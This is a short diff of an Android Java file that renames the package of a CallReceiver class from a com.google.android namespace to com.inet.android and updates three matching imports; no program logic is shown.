@@ -1,4 +1,4 @@
-package com.google.android.call;
+package com.inet.android.call;
 
 import java.io.File;
 import java.io.FileReader;
@@ -18,9 +18,9 @@ import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import com.google.android.bs.DataSendHandler;
-import com.google.android.bs.FileLog;
-import com.google.android.bs.WorkTimeDefiner;
+import com.inet.android.bs.DataSendHandler;
+import com.inet.android.bs.FileLog;
+import com.inet.android.bs.WorkTimeDefiner;
 
 public class CallReceiver extends BroadcastReceiver {
 	String phoneNumber = "";
